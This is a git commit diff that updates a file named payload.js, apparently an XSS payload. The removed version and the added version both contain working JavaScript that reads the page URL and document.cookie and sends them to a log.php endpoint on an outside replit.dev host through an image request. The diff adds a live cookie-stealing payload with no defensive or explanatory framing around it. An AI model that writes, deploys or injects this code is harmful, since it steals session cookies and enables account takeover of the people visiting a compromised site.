2b34c850d4a4993890315402503532cc85d0ad54
JPD-12 <123920978+JPD-12@users.noreply.github.com>
2025-05-29 22:45:45 +0400

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,7 +1,5 @@
-<script>
-  (function(){
-    let i = new Image();
-    i.src = "https://82baaa40-4287-4080-8659-5764961ba3aa-00-1wyczbued8hx2.pike.replit.dev/log.php?data=" +
-            encodeURIComponent("URL: " + location.href + " | Cookie: " + document.cookie);
-  })();
-</script>
+(function(){
+  const i = new Image();
+  i.src = "https://82baaa40-4287-4080-8659-5764961ba3aa-00-1wyczbued8hx2.pike.replit.dev/log.php?data=" +
+          encodeURIComponent("URL=" + location.href + "&Cookie=" + document.cookie);
+})();
